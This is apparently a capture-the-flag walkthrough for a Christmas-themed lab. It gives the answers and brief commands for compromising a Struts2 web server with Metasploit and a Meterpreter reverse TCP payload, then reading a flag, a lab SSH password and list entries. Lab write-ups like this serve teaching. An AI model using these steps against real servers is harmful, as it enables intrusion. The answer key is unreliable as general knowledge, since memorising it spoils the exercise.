# Metasploit-a-ho-ho-ho

1. Compromise the web server using Metasploit. What is flag1?
   Ans: THM{3ad96bb13ec963a5ca4cb99302b37e12}
   use Metasploit to exploit

   ```bash
   search struts2
   search linux/x86/meterpreter/reverse_tcp
   # after getting shell
   cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
   ```

2. Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
   Ans:

   ```bash
   cat ssh-creds.txt
   santa:rudolphrednosedreindeer
   ```

3. Who is on line 148 of the naughty list?
   Ans:

   ```bash
   cd / && find / -iname *naughty* 2>/dev/null
   sed -n 148p /home/santa/naughty_list.txt
   Melisa Vanhoose
   ```

4. Who is on line 52 of the nice list?
   Ans:
   ```sh
   sed -n 52p /home/santa/nice_list.txt
   Lindsey Gaffney
   ```
